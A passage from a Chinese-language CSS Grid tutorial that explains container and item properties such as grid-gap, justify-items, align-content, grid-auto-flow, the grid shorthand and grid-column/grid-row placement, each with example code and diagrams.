<p>指定网格线的大小，你可以认为它就是设置行和列中间沟槽的宽度。</p>
<p>值有：</p>
<ul>
<li><strong>&lt;line-size&gt;</strong> - 一个长度值</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-column-gap</span>: &lt;line-size&gt;;</span><br><span class="line">  <span class="attribute">grid-row-gap</span>: &lt;line-size&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">100px</span> <span class="number">50px</span> <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="number">80px</span> auto <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">grid-column-gap</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">grid-row-gap</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-column-row-gap.png" class="">
<p>只会创建行和列的沟槽，不包括边缘。</p>
<h3 id="grid-gap"><a class="markdownIt-Anchor" href="#grid-gap"></a> grid-gap</h3>
<p>一个<code>grid-column-gap</code> + <code>grid-row-gap</code>的简称。</p>
<p>值有：</p>
<ul>
<li><strong>&lt;grid-column-gap&gt;</strong>、<strong>&lt;grid-row-gap&gt;</strong> - 长度值</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-gap</span>: &lt;grid-column-gap&gt; &lt;grid-row-gap&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">100px</span> <span class="number">50px</span> <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="number">80px</span> auto <span class="number">80px</span>;</span><br><span class="line">  <span class="attribute">grid-gap</span>: <span class="number">10px</span> <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果没有写<code>grid-row-gap</code>，那么它的值将和<code>grid-column-gap</code>的一样。</p>
<h3 id="justify-items"><a class="markdownIt-Anchor" href="#justify-items"></a> justify-items</h3>
<p>让网格子项的内容和列轴对齐（<code>align-items</code>则相反，是和行轴对齐），这个值对容器里面的所有网格子项都有用。</p>
<p>值有：</p>
<ul>
<li><strong>start</strong> - 内容和网格区域的左边对齐</li>
<li><strong>end</strong> - 内容和网格区域的右边对齐</li>
<li><strong>center</strong> - 内容和网格区域的中间对齐</li>
<li><strong>stretch</strong> - 填充整个网格区域的宽度（默认值）</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-items</span>: start | end | center | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-items</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-items-start.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-items</span>: end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-items-end.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-items</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-items-center.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-items</span>: stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-items-stretch.png" class="">
<p>可以通过<code>justify-self</code>属性把这个行为设置到单独的网格子项。</p>
<h3 id="align-items"><a class="markdownIt-Anchor" href="#align-items"></a> align-items</h3>
<p>让网格子项的内容和行轴对齐（<code>justify-items</code>则相反，是和列轴对齐），这个值对容器里面的所有网格子项都有用。</p>
<p>值有：</p>
<ul>
<li><strong>start</strong> - 内容和网格区域的上边对齐</li>
<li><strong>end</strong> - 内容和网格区域的下边对齐</li>
<li><strong>center</strong> - 内容和网格区域的中间对齐</li>
<li><strong>stretch</strong> - 填充整个网格区域的高度（默认值）</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-items</span>: start | end | center | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-items</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-items-start.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-items</span>: end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-items-end.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-items-center.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-items</span>: stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-items-stretch.png" class="">
<p>可以通过<code>align-self</code>属性把这个行为设置到单独的网格子项。</p>
<h3 id="justify-content"><a class="markdownIt-Anchor" href="#justify-content"></a> justify-content</h3>
<p>有时候你的网格总大小可能会比它的网格容器的容量小，这可能是你的所有网格子项都使用了固定值比如<code>px</code>来确定大小，在这个情况下你可以在网格容器中设置网格的对齐方式。这个属性将网格和列轴对齐（和<code>align-content</code>相反，它是和行轴对齐）。</p>
<p>值有：</p>
<ul>
<li><strong>start</strong> - 网格在网格容器左边对齐</li>
<li><strong>end</strong> - 网格在网格容器右边对齐</li>
<li><strong>center</strong> - 网格在网格容器中间对齐</li>
<li><strong>stretch</strong> - 改变网格子项的容量让其填充整个网格容器宽度</li>
<li><strong>space-around</strong> - 在每个网格子项中间放置均等的空间，在始末两端只有一半大小</li>
<li><strong>space-between</strong> - 在每个网格子项中间放置均等的空间，在始末两端没有空间</li>
<li><strong>space-evenly</strong> - 在每个网格子项中间放置均等的空间，包括始末两端</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: start | end | center | stretch | space-around | space-between | space-evenly;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-start.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-end.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-center.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-stretch.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-space-around.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-space-between.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-evenly;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-space-evenly.png" class="">
<h3 id="align-content"><a class="markdownIt-Anchor" href="#align-content"></a> align-content</h3>
<p>有时候你的网格总大小可能会比它的网格容器的容量小，这可能是你的所有网格子项都使用了固定值比如<code>px</code>来确定大小，在这个情况下你可以在网格容器中设置网格的对齐方式。这个属性将网格和行轴对齐（和<code>justify-content</code>相反，它是和列轴对齐）。</p>
<p>值有：</p>
<ul>
<li><strong>start</strong> - 网格在网格容器上边对齐</li>
<li><strong>end</strong> - 网格在网格容器下边对齐</li>
<li><strong>center</strong> - 网格在网格容器中间对齐</li>
<li><strong>stretch</strong> - 改变网格子项的容量让其填充整个网格容器高度</li>
<li><strong>space-around</strong> - 在每个网格子项中间放置均等的空间，在始末两端只有一半大小</li>
<li><strong>space-between</strong> - 在每个网格子项中间放置均等的空间，在始末两端没有空间</li>
<li><strong>space-evenly</strong> - 在每个网格子项中间放置均等的空间，包括始末两端</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: start | end | center | stretch | space-around | space-between | space-evenly;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-start.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-end.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-center.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-stretch.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-space-around.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: space-between;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-space-between.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: space-evenly;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-space-evenly.png" class="">
<h3 id="grid-auto-columns"><a class="markdownIt-Anchor" href="#grid-auto-columns"></a> grid-auto-columns</h3>
<h3 id="grid-auto-rows"><a class="markdownIt-Anchor" href="#grid-auto-rows"></a> grid-auto-rows</h3>
<p>指定自动生成的网格轨道的大小（又叫隐式网格轨道），当你精确指定行和列的位置大于定义的网格（通过 grid-template-rows/grid-template-columns）时隐式网格轨道会被创建。</p>
<p>值有：</p>
<ul>
<li><strong>&lt;track-size&gt;</strong> - 可以是一个长度，百分比或者是一个网格中自由空间的份数（通过使用<code>fr</code>单位）。</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-auto-columns</span>: &lt;track-size&gt; ...;</span><br><span class="line">  <span class="attribute">grid-auto-rows</span>: &lt;track-size&gt; ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了说明隐式网格轨道如何被创建，思考一下这个：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="number">60px</span> <span class="number">60px</span>;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="number">90px</span> <span class="number">90px</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-auto.png" class="">
<p>这里创建了 2 x 2 的网格。</p>
<p>但现在想象你使用<code>grid-column</code>和<code>grid-row</code>来定位你的网格项，就像这样：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">1</span> / <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">2</span> / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-b</span>&#123;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">5</span> / <span class="number">6</span>;</span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">2</span> / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/implicit-tracks.png" class="">
<p>我们告诉<code>.item-b</code>在第 5 列网格线开始第 6 列网格线结束，但我们还没有定义第 5 或者第 6 列。因为我们引用的线不存在，0 宽度的隐式网格轨道将被创建来填充这些空缺。我们可以使用<code>grid-auto-columns</code>和<code>grid-auto-rows</code>来指定这些隐式网格轨道的宽度：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-auto-columns</span>: <span class="number">60px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/implicit-tracks-with-widths.png" class="">
<h3 id="grid-auto-flow"><a class="markdownIt-Anchor" href="#grid-auto-flow"></a> grid-auto-flow</h3>
<p>如果你有网格项没有明确地放置在网格中，自动布局算法会将网格项自动放置起来，这个属性控制自动布局算法如何工作。</p>
<p>值有：</p>
<ul>
<li><strong>row</strong> - 告诉自动布局算法在每一行中依次填充，必要时添加新行</li>
<li><strong>column</strong> - 告诉自动布局算法在每一列中依次填充，必要时添加新列</li>
<li><strong>dense</strong> - 告诉自动布局算法如果更小的子项出现时尝试在网格中填补漏洞</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">grid-auto-flow</span>: row | column | row dense | column dense</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意<code>dense</code>可能让你的网格子项出现错乱。</p>
<p>举个例子：</p>
<p>考虑一下这个 HTML：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item-a"</span>&gt;</span>item-a<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item-b"</span>&gt;</span>item-b<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item-c"</span>&gt;</span>item-c<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item-d"</span>&gt;</span>item-d<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item-e"</span>&gt;</span>item-e<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>你定义一个 5 列 2 行的网格，并设置<code>grid-auto-flow</code>为<code>row</code>（这也是默认值）：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">60px</span> <span class="number">60px</span> <span class="number">60px</span> <span class="number">60px</span> <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="number">30px</span> <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">grid-auto-flow</span>: row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当在网格中放置子项时，你只能为其中 2 个指定斑点：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">    <span class="attribute">grid-column</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">grid-row</span>: <span class="number">1</span> / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item-e</span>&#123;</span><br><span class="line">    <span class="attribute">grid-column</span>: <span class="number">5</span>;</span><br><span class="line">    <span class="attribute">grid-row</span>: <span class="number">1</span> / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为我们设置<code>grid-auto-flow</code>为<code>row</code>，我们的网格看起来就像这样，注意这三个我们没有放置的子项（<code>item-b</code>，<code>item-c</code>，<code>item-d</code>）将如何以行的方式流动的：</p>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-auto-flow-row.png" class="">
<p>如果我们将<code>grid-auto-flow</code>设为<code>column</code>，<code>item-b</code>，<code>item-c</code>和<code>item-d</code>以列的方式向下流动：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">60px</span> <span class="number">60px</span> <span class="number">60px</span> <span class="number">60px</span> <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="number">30px</span> <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">grid-auto-flow</span>: column;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-auto-flow-column.png" class="">
<h3 id="grid"><a class="markdownIt-Anchor" href="#grid"></a> grid</h3>
<p>以下属性的简写方式：<code>grid-template-rows</code>，<code>grid-template-columns</code>，<code>grid-template-areas</code>，<code>grid-auto-rows</code>，<code>grid-auto-columns</code>，<code>grid-auto-flow</code>。它也可以设置<code>grid-column-gap</code>和<code>grid-row-gap</code>为它们的初始值，尽管它们不能通过这个属性来精确设置。<br />
值有：</p>
<ul>
<li><strong>none</strong> - 设置所有子属性为它们的初始值</li>
<li><strong>&lt;grid-template-rows&gt;</strong> / <strong>&lt;grid-template-columns&gt;</strong> - 分别设置<code>grid-template-rows</code>和<code>grid-template-columns</code>的指定值，以及设置其他所有子属性为初始值</li>
<li><strong>&lt;grid-auto-flow&gt;</strong> [<strong>&lt;grid-auto-rows&gt;</strong> [ / <strong>&lt;grid-auto-columns&gt;</strong>] ] - 分别接收所有像<code>grid-auto-flow</code>，<code>grid-auto-rows</code>和<code>grid-auto-columnsaccepts</code>的相同值。如果<code>grid-auto-columns</code>被省略了，那么它的值会通过<code>grid-auto-rows</code>来设置，如果两个都省略了，它们将被设置为默认值。</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">grid</span>: none | &lt;grid-template-rows&gt; / &lt;grid-template-columns&gt; | &lt;grid-auto-flow&gt; [&lt;grid-auto-rows&gt; [/ &lt;grid-auto-columns&gt;]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<p>下面 2 段代码是相等的：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">grid</span>: <span class="number">200px</span> auto / <span class="number">1</span>fr auto <span class="number">1</span>fr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="number">200px</span> auto;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">1</span>fr auto <span class="number">1</span>fr;</span><br><span class="line">    <span class="attribute">grid-template-areas</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面这 2 段代码也是等价的：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">grid</span>: column <span class="number">1</span>fr / auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">grid-auto-flow</span>: column;</span><br><span class="line">    <span class="attribute">grid-auto-rows</span>: <span class="number">1</span>fr;</span><br><span class="line">    <span class="attribute">grid-auto-columns</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它也可以接收一个更复杂但又相当方便的语法来一次性设置所有属性，你可以指定<code>grid-template-areas</code>，<code>grid-auto-rows</code>和<code>grid-auto-columns</code>，并且所有其他子属性被设置为它们的默认值。你需要做的是指定网格线的名称和网格轨迹的大小来生成它们的网格区域。最简单的表述方法就是举一个例子：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">grid</span>: [row1-start] <span class="string">"header header header"</span> <span class="number">1</span>fr [row1-end]</span><br><span class="line">          [row2-start] <span class="string">"footer footer footer"</span> <span class="number">25px</span> [row2-end]</span><br><span class="line">          / auto <span class="number">50px</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面跟下面是等价的：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">grid-template-areas</span>: <span class="string">"header header header"</span></span><br><span class="line">                         <span class="string">"footer footer footer"</span>;</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: [row1-start] <span class="number">1</span>fr [row1-end row2-start] <span class="number">25px</span> [row2-end];</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: auto <span class="number">50px</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="网格项的属性"><a class="markdownIt-Anchor" href="#网格项的属性"></a> 网格项的属性</h2>
<ul>
<li>grid-column-start</li>
<li>grid-column-end</li>
<li>grid-row-start</li>
<li>grid-row-end</li>
<li><a href="#grid-column%E4%B8%8Egrid-row">grid-column</a></li>
<li><a href="#grid-column%E4%B8%8Egrid-row">grid-row</a></li>
<li><a href="#grid-area">grid-area</a></li>
<li><a href="#justify-self">justify-self</a></li>
<li><a href="#align-self">align-self</a></li>
</ul>
<h3 id="grid-column-start-grid-column-end-grid-row-start-和-grid-row-end"><a class="markdownIt-Anchor" href="#grid-column-start-grid-column-end-grid-row-start-和-grid-row-end"></a> grid-column-start、grid-column-end、grid-row-start 和 grid-row-end</h3>
<p>通过参考指定的网格线来决定网格中一个网格项的位置，<code>grid-column-start/grid-row-start</code>是指网格子项开始的线，<code>grid-column-end/grid-row-end</code>是指网格项结束的线。</p>
<p>值有：</p>
<ul>
<li><code>&lt;line&gt;</code> - 可以是一个数字以适用被标记了数字号的网格线，或者是一个名字以适用命名了的网格线</li>
<li>span <code>&lt;number&gt;</code> - 子项将跨越指定数字的网格轨道</li>
<li>span <code>&lt;name&gt;</code> - 子项将跨越到指定名字之前的网格线</li>
<li>auto - 表示自动布局，自动跨越或者默认跨越一个</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line">  <span class="attribute">grid-column-start</span>: &lt;number&gt; | &lt;name&gt; | span &lt;number&gt; | span &lt;name&gt; | auto</span><br><span class="line">  grid-column-end: &lt;number&gt; | &lt;name&gt; | span &lt;number&gt; | span &lt;name&gt; | auto</span><br><span class="line">  grid-row-start: &lt;number&gt; | &lt;name&gt; | span &lt;number&gt; | span &lt;name&gt; | auto</span><br><span class="line">  grid-row-end: &lt;number&gt; | &lt;name&gt; | span &lt;number&gt; | span &lt;name&gt; | auto</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举个例子：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-a</span>&#123;</span><br><span class="line">  <span class="attribute">grid-column-start</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-column-end</span>: five;</span><br><span class="line">  <span class="attribute">grid-row-start</span>: row1-start</span><br><span class="line">  grid-row-end: <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-start-end-a.png" class="">
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-b</span>&#123;</span><br><span class="line">  <span class="attribute">grid-column-start</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">grid-column-end</span>: span col4-start;</span><br><span class="line">  <span class="attribute">grid-row-start</span>: <span class="number">2</span></span><br><span class="line">  grid-row-end: span <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="http://chris.house/images/grid-start-end-b.png" class="">
<p>如果<code>grid-column-end/grid-row-end</code>没有生命，网格项将默认跨越一个网格轨道。</p>
<p>网格项可以互相重叠，你可以使用<code>z-index</code>来控制他们的层叠顺序。</p>
<h3 id="grid-column与grid-row"><a class="markdownIt-Anchor" href="#grid-column与grid-row"></a> grid-column与grid-row</h3>
<p><code>grid-column-start</code> + <code>grid-column-end</code>，和<code>grid-row-start</code> + <code>grid-row-end</code>的简写，分别独立。</p>
<p>值有：</p>
<ul>
<li><start-line> / <end-line> - 每一个属性都可以接收普通模式的值，包括<code>span</code></li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line">  <span class="attribute">grid-column</span>: &lt;start-line&gt; / &lt;end-line&gt; | &lt;start-line&gt; / span &lt;value&gt;;</span><br><span class="line">  <span class="attribute">grid-row</span>: &lt;start-line&gt; / &lt;end-line&gt; | &lt;start-line&gt; / span &lt;value&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-c</span>&#123;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">3</span> / span <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-row</span>: third-line / <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
